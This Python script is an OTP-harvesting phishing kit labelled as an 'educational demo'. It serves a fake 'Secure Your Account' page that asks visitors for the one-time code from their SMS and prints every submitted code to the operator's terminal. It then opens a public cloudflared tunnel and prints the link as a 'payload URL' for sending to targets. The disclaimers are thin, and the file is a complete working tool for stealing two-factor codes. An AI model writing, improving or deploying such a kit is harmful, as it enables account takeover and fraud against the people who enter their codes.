#!/usr/bin/env python3
"""
HCO OTP Snag (Educational demo) — main.py

Features:
- Fancy colored banner and 8-second countdown with YouTube redirect
- Starts local Flask demo OTP page (educational only)
- Attempts to auto-start cloudflared and prints a single clean public URL (if available)
- Graceful fallback if cloudflared isn't installed
- Cleans up cloudflared process on exit

Usage:
  python3 main.py        # attempt to use cloudflared if installed
  python3 main.py --no-cf  # skip trying cloudflared

Notes:
- This is a demo only. Do not use to capture real OTPs without explicit permission.
- On Termux, termux-open-url is used to open YouTube; otherwise webbrowser is used.
"""

import os
import sys
import time
import argparse
import threading
import subprocess
import signal
import webbrowser
from flask import Flask, render_template_string, request

# ---------------- CONFIG ----------------
YOUTUBE_LINK = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
HOST = "0.0.0.0"
PORT = 5000
# ----------------------------------------

app = Flask(__name__)

# Educational OTP HTML (simple, styled)
HTML_PAGE = """
<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <title>Account Verification — HCO Demo</title>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <style>
    body{background:#0f0f10;color:#eee;font-family:system-ui;padding:40px}
    .box{max-width:420px;margin:40px auto;background:#121214;padding:24px;border-radius:12px;box-shadow:0 8px 30px rgba(0,0,0,0.6)}
    h1{color:#ff3b3b;margin:0 0 10px}
    p.lead{color:#82ff9e;font-weight:700}
    input[type=text]{width:100%;padding:10px;border-radius:8px;border:1px solid #2b2b2b;background:#0b0b0b;color:#fff;margin-top:8px}
    button{margin-top:12px;padding:10px 16px;border-radius:8px;border:none;background:#ff3b3b;color:#fff;font-weight:700;cursor:pointer}
    .muted{color:#9aa0a6;font-size:13px;margin-top:10px}
  </style>
</head>
<body>
  <div class="box">
    <h1>Secure Your Account</h1>
    <p class="lead">Enter the one OTP you got in your text message to secure your account</p>
    <form method="POST">
      <input name="otp" type="text" placeholder="Enter OTP" required />
      <input type="submit" value="Verify" />
    </form>
    <p class="muted">This is an educational demo. Do not enter real sensitive codes from others.</p>
  </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        otp = request.form.get("otp", "")
        # educational only — print to terminal but do not store sensitive data
        print("\n\033[1;31m[📩 DEMO OTP RECEIVED]\033[0m", otp)
        sys.stdout.flush()
        return "<h2 style='color:green;text-align:center;margin-top:60px'>✅ OTP Received (Demo)</h2>"
    return render_template_string(HTML_PAGE)

# ---- Cloudflared launcher/parser ----
def cloudflared_available():
    """Return True if cloudflared appears runnable in PATH."""
    try:
        subprocess.run(["cloudflared", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True
    except Exception:
        return False

def start_cloudflared_and_get_url(port, timeout=20):
    """
    Start cloudflared quick tunnel and attempt to parse a trycloudflare URL.
    Returns (process, public_url_or_None).
    We suppress verbose output and only return the parsed URL.
    """
    cmd = ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"]
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    except Exception as e:
        print(f"[!] Failed to start cloudflared: {e}")
        return None, None

    url_holder = {"url": None}
    pattern = None
    try:
        import re
        pattern = re.compile(r"https?://[^\s]*trycloudflare\.com[^\s]*", re.IGNORECASE)
    except Exception:
        pattern = None

    def reader_loop():
        try:
            for line in proc.stdout:
                if not line:
                    continue
                line = line.strip()
                # Only try to parse the line for a trycloudflare url
                if pattern:
                    m = pattern.search(line)
                    if m:
                        url_holder["url"] = m.group(0)
                        # once we have the URL we stop reading further
                        break
                # we intentionally do NOT print cloudflared lines to keep UI clean
        except Exception:
            pass

    t = threading.Thread(target=reader_loop, daemon=True)
    t.start()

    waited = 0
    while waited < timeout:
        if url_holder["url"]:
            return proc, url_holder["url"]
        time.sleep(0.5)
        waited += 0.5

    # timed out — return process (so caller may decide) and None for URL
    return proc, url_holder["url"]

# ---- Banner + countdown + open YouTube ----
def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def open_url_in_termux(url):
    # try termux-open-url first (Termux environment)
    try:
        rc = os.system(f"termux-open-url '{url}'")
        return rc == 0
    except Exception:
        return False

def show_banner_and_redirect():
    clear()
    # red border with green content
    RED = "\033[1;31m"
    GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    RESET = "\033[0m"

    print(RED + "╔══════════════════════════════════════╗" + RESET)
    print(RED + "║" + RESET + "  " + GREEN + "🔥  WELCOME TO HCO OTP SNAG TOOL 🔥  " + RESET + " " + RED + "║" + RESET)
    print(RED + "╚══════════════════════════════════════╝" + RESET + "\n")
    print(YELLOW + "🎯 Support our work — subscribe to our channel!" + RESET)
    print(YELLOW + "📢 Subscribe to our YouTube channel and then come back so you can use this tool!\n" + RESET)

    # animated countdown line (same format you requested)
    countdown_line = "🚀 Redirecting in: "
    print(countdown_line, end="", flush=True)
    for i in range(8, 0, -1):
        # overwrite the digits only
        print(f"{i}...", end="", flush=True)
        time.sleep(1)
    print("\n")

    # open YouTube (try termux-open-url, then webbrowser)
    opened = False
    try:
        if open_url_in_termux(YOUTUBE_LINK):
            opened = True
    except Exception:
        opened = False

    if not opened:
        try:
            webbrowser.open(YOUTUBE_LINK)
            opened = True
        except Exception:
            opened = False

    if not opened:
        print("[!] Please open this URL manually in your browser:")
        print(YOUTUBE_LINK)

    # prompt user to continue when they come back
    try:
        input(GREEN + "\n✅ After subscribing, press ENTER to continue..." + RESET)
    except KeyboardInterrupt:
        print("\nExiting.")
        sys.exit(0)

# ---- Main runner ----
def run_server_thread():
    # run flask in a separate thread to keep main thread responsive
    server_thread = threading.Thread(target=lambda: app.run(host=HOST, port=PORT, debug=False, use_reloader=False), daemon=True)
    server_thread.start()
    return server_thread

def print_clean_info(public_url):
    GREEN = "\033[1;32m"
    CYAN = "\033[1;36m"
    RESET = "\033[0m"
    print("\n" + GREEN + "=== HCO OTP Snag — Ready ===" + RESET)
    if public_url:
        print(CYAN + f"Public payload URL: {public_url}/" + RESET)
    else:
        print(CYAN + f"Local payload URL: http://127.0.0.1:{PORT}/" + RESET)
    print("Open the payload page on your test device to try the demo.\n")

def install_hint():
    print("\n[!] cloudflared not found in PATH.")
    print("If you want the quick trycloudflare tunnel, install cloudflared for your device.")
    print("On Android/Termux you can download the cloudflared binary for arm/arm64, chmod +x and place it in your PATH.")
    print("Or use ngrok as an alternative to expose http://127.0.0.1:{PORT}/ externally.\n".format(PORT=PORT))

def graceful_kill(proc):
    try:
        if proc and proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except Exception:
                proc.kill()
    except Exception:
        pass

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--no-cf", action="store_true", help="skip attempting cloudflared")
    args = parser.parse_args()

    # 1) banner + youtube redirect + wait for user
    show_banner_and_redirect()

    # 2) start flask server
    print("\n[INFO] Starting local demo server...")
    server_thread = run_server_thread()
    time.sleep(1)  # give flask slight time to bind

    cf_proc = None
    public_url = None

    # 3) try cloudflared unless user opted out
    if not args.no_cf:
        if cloudflared_available():
            print("[INFO] cloudflared detected — attempting to start a quick tunnel (this may take a second)...")
            cf_proc, public_url = start_cloudflared_and_get_url(PORT, timeout=20)
            if public_url:
                # show only the clean URL
                print_clean_info(public_url)
            else:
                # started but no url parsed in time
                print("[WARN] cloudflared started but no public URL found within timeout.")
                print_clean_info(None)
        else:
            install_hint()
            print_clean_info(None)
    else:
        print_clean_info(None)

    # keep main thread alive while Flask runs
    try:
        while True:
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[INFO] Shutting down...")
    finally:
        graceful_kill(cf_proc)
        print("[INFO] Goodbye.")

if __name__ == "__main__":
    main()
